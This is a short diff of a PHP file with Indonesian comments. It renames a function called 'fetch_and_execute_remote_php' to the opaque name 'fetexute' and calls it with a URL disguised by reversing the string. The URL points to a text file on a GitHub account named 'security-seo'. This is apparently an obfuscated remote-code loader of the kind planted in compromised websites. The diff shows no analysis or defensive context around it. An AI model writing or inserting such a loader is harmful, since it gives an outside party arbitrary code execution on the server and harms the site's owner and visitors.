@@ -1,6 +1,6 @@
 <?php
 
-function fetch_and_execute_remote_php($url) {
+function fetexute($url) {
     // Mengatur opsi untuk konteks stream, termasuk header HTTP dan SSL
     $options = [
         "http" => [
@@ -55,6 +55,6 @@ function fetch_and_execute_remote_php($url) {
     }
 }
 
-fetch_and_execute_remote_php(strrev("txt.7pa/niam/omedlhs/oes-ytiruces/moc.tnetnocresubuhtig.war//:sptth"));
+fetexute(strrev("txt.7pa/niam/omedlhs/oes-ytiruces/moc.tnetnocresubuhtig.war//:sptth"));
 
-?
+?>
